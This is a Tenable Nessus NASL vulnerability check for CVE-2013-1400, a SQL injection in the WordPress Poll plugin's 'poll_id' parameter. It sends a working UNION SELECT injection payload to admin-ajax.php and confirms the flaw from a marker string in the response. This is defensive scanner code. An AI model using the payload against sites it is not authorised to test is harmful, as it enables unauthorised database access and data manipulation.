#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64894);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2013-1400");
  script_bugtraq_id(57630);
  script_osvdb_id(89741);

  script_name(english:"WordPress Poll Plugin 'poll_id' Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'poll_id' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress Poll Plugin installed on the remote host is affected by
a SQL injection vulnerability due to a failure to properly sanitize
user-supplied input to the 'poll_id' parameter of the
'wp-admin/admin-ajax.php' script. An unauthenticated, remote attacker
can leverage this issue to launch a SQL injection attack against the
affected application, leading to manipulation of data in the backend
database or the disclosure of arbitrary data.

The application is also reportedly affected by several additional SQL
injection vulnerabilities; however, Nessus has not tested for these.");
  # http://www.girlinthemiddle.net/2013/01/multiple-sql-injection-vulnerabilities.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?98bc791e");
  script_set_attribute(attribute:"solution", value:
"Either upgrade to version 34.05 or later, or remove the plugin.

Note that the plugin is currently not available through the
WordPress.org Plugin Directory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'WordPress Poll';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "cardoza-wordpress-poll/public/js/CWPPoll.js"][0] =
    make_list('function vote_poll');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

data = SCRIPT_NAME + "-" + unixtime();
magic = hexstr(data);
payload = "action=view_poll_result&poll_id=0 UNION SELECT NULL, NULL, NULL, " +
  "CONCAT(0x3A3A736372697074206e616d653A3A,0x" + magic + ",0x3A3A)";

payload = urlencode(
  str        : payload,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
               "56789=_&"
);

res2 = http_send_recv3(
  method    : "POST",
  item      : dir + "/wp-admin/admin-ajax.php/?",
  data      : payload,
  content_type : "application/x-www-form-urlencoded",
  port         : port,
  exit_on_fail : TRUE
);
attack = http_last_sent_request();

if (
  ">Total votes:" >< res2[2] &&
  "::script name::" >< res2[2] &&
  data >< res2[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following '+
      'request :' +
      '\n' +
      '\n' + attack +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin+" plugin");
